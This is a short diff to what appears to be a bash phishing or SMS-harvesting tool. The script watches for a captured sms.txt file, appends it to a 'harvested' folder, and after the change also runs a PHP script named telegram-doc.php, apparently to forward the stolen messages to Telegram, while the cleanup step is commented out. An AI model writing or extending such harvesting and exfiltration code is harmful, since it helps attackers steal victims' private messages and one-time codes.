@@ -48,7 +48,8 @@ while [ true ]; do
 if [[ -e "sms.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] SMS Received!\n"
 cat sms.txt >> ./harvested/sms.saved.txt
-rm -rf sms.txt
+php telegram-doc.php
+#rm -rf sms.txt
 printf "\n\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m sms.saved.txt\e[0m\n"
 fi
 sleep 0.5
